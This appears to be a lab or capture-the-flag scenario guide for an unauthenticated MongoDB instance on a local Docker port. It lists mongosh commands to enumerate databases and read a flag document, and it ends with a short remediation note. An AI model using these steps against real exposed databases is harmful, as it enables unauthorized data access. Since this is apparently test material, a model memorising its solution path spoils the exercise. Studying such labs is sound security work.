# DB-06: MongoDB Unauthorized Access

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-06 |
| 名称 | MongoDB Unauthorized Access |
| 技术/CVE | N/A (misconfiguration) |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10206 |

## 场景概述
- 技术：N/A (misconfiguration)
- 难度：L1
- 交付方式：docker
- 入口端口：10206
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Default Configuration Weakness) |
| Difficulty | L1 |
| Port | 10206 |
| Path | scenarios/db/mongodb-unauth/ |
| Type | docker |
| Database | MongoDB 7.0 |

### Attack Path Summary
```
Connect to MongoDB without authentication → List databases → Query flags.flag_collection → Retrieve flag document
```

### Prerequisites

#### Knowledge
- MongoDB connection basics: Understanding how to connect to a MongoDB instance using `mongosh` and specify host/port parameters
- NoSQL database enumeration: Listing databases and collections to discover where data is stored
- Document query syntax: Using `find()` with filters and `pretty()` for readable output in MongoDB

#### Tools
- mongosh: MongoDB Shell client for connecting to and querying MongoDB instances
- MongoDB Compass: GUI client for visual exploration of MongoDB databases and collections

### Step-by-Step Exploitation

#### Step 1: Connect to MongoDB

Connect to the target MongoDB instance using `mongosh`. Since authentication is disabled, no credentials are required.

```bash
mongosh --host localhost --port 10206
```

#### Step 2: List Available Databases

Once connected, list all databases to discover what is available.

```javascript
show dbs
```

Expected output includes a database named `flags` (or similar).

#### Step 3: Switch to the Flags Database

Select the database containing the flag.

```javascript
use flags
```

#### Step 4: List Collections

List all collections within the `flags` database.

```javascript
show collections
```

Expected output includes `flag_collection`.

#### Step 5: Query the Flag Document

Retrieve all documents from the flag collection to read the flag.

```javascript
db.flag_collection.find().pretty()
```

The flag is displayed as a field in one of the returned documents.

#### Step 6: Direct One-Liner

The entire attack can be performed in a single command:

```bash
mongosh --host localhost --port 10206 --quiet --eval 'db.getSiblingDB("flags").flag_collection.find().pretty()'
```

### Flag Location
- Stored as a field in a document within the `flags.flag_collection` collection
- Accessible without authentication due to disabled access control

### Verification Commands
```bash
mongosh --host localhost --port 10206 --quiet --eval 'db.getSiblingDB("flags").flag_collection.findOne()' | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | MongoDB TCP service and mongosh/client queries |
| 侦察与前置条件 | Unauthenticated MongoDB access and collection enumeration |
| 核心漏洞与利用 | Connect without authentication and query sensitive collections |
| 权限、横向或影响 | Unauthorized database data access |
| 验证 | Retrieve the document containing the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
